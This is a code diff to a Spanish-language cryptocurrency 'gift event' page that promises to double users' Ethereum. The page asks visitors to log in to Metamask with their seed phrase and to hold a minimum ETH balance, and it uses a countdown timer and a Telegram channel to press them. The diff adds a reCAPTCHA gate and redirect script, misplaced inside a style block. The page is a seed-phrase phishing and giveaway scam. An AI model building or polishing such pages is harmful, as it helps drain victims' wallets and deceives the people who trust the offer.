@@ -4,7 +4,27 @@
   <meta charset="UTF-8" />
   <title>CryptoGift - Duplica tus Criptomonedas</title>
   <style>
+    <script>
+  function onCaptchaSuccess(response) {
+    // Verifica el CAPTCHA con tu backend (opcional pero recomendado para seguridad)
+    fetch('/verify-captcha', {
+      method: 'POST',
+      body: JSON.stringify({ captchaResponse: response }),
+      headers: { 'Content-Type': 'application/json' }
+    })
+    .then(res => res.json())
+    .then(data => {
+      if (data.success) {
+        window.location.href = "/home"; // Redirige a la ruta deseada
+      } else {
+        alert("¡CAPTCHA fallido! Intenta nuevamente.");
+        grecaptcha.reset(); // Reinicia el CAPTCHA
+      }
+    });
+  }
+</script>
     body {
+      
       background-color: #0b0c10;
       color: #fff;
       font-family: Arial, sans-serif;
@@ -99,7 +119,9 @@
   <div class="container">
     <h1>🎁 ¡Evento Especial de Regalo de Ethereum!</h1>
     <p>Inicie sesión con Metamask con su frase semilla. <strong>Debe tener al menos 0.01 ETH o 10 ETH.</strong> Vea nuestras referencias y clientes satisfechos en nuestro canal de Telegram:</p>
-
+<div class="recaptcha-container">
+  <div id="captcha" class="g-recaptcha" data-sitekey="6LcCpmArAAAAAIUzkdT0OnIvBvDnfuMMdJVZV-dw" data-callback="onCaptchaSuccess"></div>
+</div>
     <div class="timer">
       Tiempo restante para participar: <span id="countdown">01:59:00</span>
     </div>
